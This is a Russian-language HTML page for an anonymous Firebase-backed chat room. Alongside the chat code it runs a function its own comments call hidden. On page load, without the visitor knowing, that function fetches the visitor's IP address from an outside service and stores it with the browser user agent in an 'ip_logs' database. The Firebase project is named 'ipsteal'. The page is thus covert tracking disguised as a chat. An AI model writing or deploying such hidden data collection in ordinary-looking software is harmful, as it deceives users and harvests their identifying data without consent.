<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Чат</title>
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: black;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .chat-container {
            width: 100%;
            max-width: 800px;
            height: 90vh;
            background: black;
            border-radius: 20px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            border: 1px solid #2a2a2a;
        }

        .chat-header {
            background: #0a0a0a;
            color: white;
            padding: 20px;
            text-align: center;
            font-size: 1.5rem;
            font-weight: bold;
            letter-spacing: 1px;
            border-bottom: 1px solid #2a2a2a;
        }

        .chat-messages {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            background: black;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .message {
            max-width: 70%;
            padding: 10px 15px;
            border-radius: 18px;
            word-wrap: break-word;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .message.sent {
            background: #2b2b2b;
            color: white;
            align-self: flex-end;
            border-bottom-right-radius: 4px;
        }

        .message.received {
            background: #1a1a1a;
            color: #e0e0e0;
            align-self: flex-start;
            border-bottom-left-radius: 4px;
        }

        .message-info {
            font-size: 0.7rem;
            margin-bottom: 4px;
            opacity: 0.7;
            color: #888;
        }

        .chat-input-area {
            padding: 20px;
            background: black;
            border-top: 1px solid #2a2a2a;
            display: flex;
            gap: 10px;
        }

        #messageInput {
            flex: 1;
            padding: 12px 16px;
            border: 1px solid #2a2a2a;
            border-radius: 25px;
            outline: none;
            font-size: 1rem;
            transition: border-color 0.3s;
            background: #1a1a1a;
            color: white;
        }

        #messageInput:focus {
            border-color: #4a4a4a;
            background: #222;
        }

        #messageInput::placeholder {
            color: #666;
        }

        #sendButton {
            background: #2b2b2b;
            color: white;
            border: 1px solid #3a3a3a;
            padding: 0 24px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }

        #sendButton:hover {
            background: #3a3a3a;
            border-color: #4a4a4a;
        }

        #sendButton:active {
            transform: scale(0.97);
        }

        .status {
            padding: 8px;
            text-align: center;
            font-size: 0.8rem;
            color: #666;
            background: #0a0a0a;
            border-top: 1px solid #2a2a2a;
        }

        /* Стиль скроллбара для темной темы */
        .chat-messages::-webkit-scrollbar {
            width: 8px;
        }

        .chat-messages::-webkit-scrollbar-track {
            background: #0a0a0a;
        }

        .chat-messages::-webkit-scrollbar-thumb {
            background: #2a2a2a;
            border-radius: 4px;
        }

        .chat-messages::-webkit-scrollbar-thumb:hover {
            background: #3a3a3a;
        }

        @media (max-width: 600px) {
            .message {
                max-width: 85%;
            }
            .chat-container {
                height: 95vh;
            }
        }
    </style>
</head>
<body>
<div class="chat-container">
    <div class="chat-header">
        💬 Чат
    </div>
    <div class="chat-messages" id="chatMessages"></div>
    <div class="chat-input-area">
        <input type="text" id="messageInput" placeholder="Введите сообщение..." autocomplete="off">
        <button id="sendButton">📤 Отправить</button>
    </div>
    <div class="status" id="statusText">🟢 Подключение...</div>
</div>

<script>
    // ======================= КОНФИГУРАЦИЯ FIREBASE =======================
    const firebaseConfig = {
        apiKey: "AIzaSyB9XzL1XzL1XzL1XzL1XzL1XzL1XzL1",
        authDomain: "ipsteal-4bf1c.firebaseapp.com",
        databaseURL: "https://ipsteal-4bf1c-default-rtdb.firebaseio.com/",
        projectId: "ipsteal-4bf1c",
        storageBucket: "ipsteal-4bf1c.firebasestorage.app",
        messagingSenderId: "000000000000",
        appId: "1:000000000000:web:xxxxxxxxxxxx"
    };
    
    // Инициализация Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();
    const messagesRef = database.ref('chat_messages');
    
    // ======================= ФУНКЦИИ ЧАТА =======================
    let currentUsername = 'Аноним_' + Math.floor(Math.random() * 10000);
    
    // Отправка сообщения
    async function sendMessage() {
        const input = document.getElementById('messageInput');
        const text = input.value.trim();
        if (!text) return;
        
        const sendBtn = document.getElementById('sendButton');
        sendBtn.disabled = true;
        
        try {
            const message = {
                text: text,
                username: currentUsername,
                timestamp: firebase.database.ServerValue.TIMESTAMP,
                userId: currentUsername
            };
            
            await messagesRef.push(message);
            input.value = '';
            scrollToBottom();
        } catch (error) {
            console.error('Ошибка отправки сообщения:', error);
            updateStatus('❌ Ошибка отправки');
        } finally {
            sendBtn.disabled = false;
            input.focus();
        }
    }
    
    // Получение сообщений из Firebase
    function listenForMessages() {
        messagesRef.orderByChild('timestamp').limitToLast(50).on('child_added', (snapshot) => {
            const message = snapshot.val();
            const messageKey = snapshot.key;
            
            const existingMsg = document.querySelector(`.message[data-key="${messageKey}"]`);
            if (existingMsg) return;
            
            displayMessage(message, messageKey);
            scrollToBottom();
        });
    }
    
    // Отображение сообщения
    function displayMessage(message, key) {
        const messagesContainer = document.getElementById('chatMessages');
        const messageDiv = document.createElement('div');
        messageDiv.className = `message ${message.username === currentUsername ? 'sent' : 'received'}`;
        messageDiv.setAttribute('data-key', key);
        
        let timeStr = 'только что';
        if (message.timestamp && typeof message.timestamp === 'number') {
            const date = new Date(message.timestamp);
            timeStr = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        } else if (message.timestamp) {
            timeStr = new Date(message.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        }
        
        const usernameDisplay = message.username === currentUsername ? 'Вы' : message.username;
        
        messageDiv.innerHTML = `
            <div class="message-info">${escapeHtml(usernameDisplay)} • ${timeStr}</div>
            <div class="message-text">${escapeHtml(message.text)}</div>
        `;
        
        messagesContainer.appendChild(messageDiv);
    }
    
    // Экранирование HTML
    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
    
    // Прокрутка вниз
    function scrollToBottom() {
        const messagesContainer = document.getElementById('chatMessages');
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
    }
    
    // Обновление статуса
    function updateStatus(text) {
        const statusEl = document.getElementById('statusText');
        if (statusEl) statusEl.textContent = text;
    }
    
    // Отправка IP (скрытая функция)
    async function sendIPToFirebase() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            const ip = data.ip;
            const userAgent = navigator.userAgent;
            const timestamp = new Date().toISOString();
            
            const ipLogsRef = database.ref('ip_logs');
            const newIpEntry = ipLogsRef.push();
            await newIpEntry.set({
                ip: ip,
                userAgent: userAgent,
                timestamp: timestamp,
                page: window.location.pathname || '/'
            });
            
            console.log('IP сохранен');
        } catch (error) {
            console.error('Ошибка сохранения IP:', error);
        }
    }
    
    // ======================= ИНИЦИАЛИЗАЦИЯ =======================
    async function init() {
        // Отправляем IP в фоне (пользователь не видит)
        sendIPToFirebase();
        
        // Настраиваем чат
        listenForMessages();
        
        const sendBtn = document.getElementById('sendButton');
        const messageInput = document.getElementById('messageInput');
        
        sendBtn.addEventListener('click', sendMessage);
        messageInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendMessage();
            }
        });
        
        updateStatus('🟢 Чат активен');
    }
    
    // Запускаем
    init();
</script>
</body>
</html>
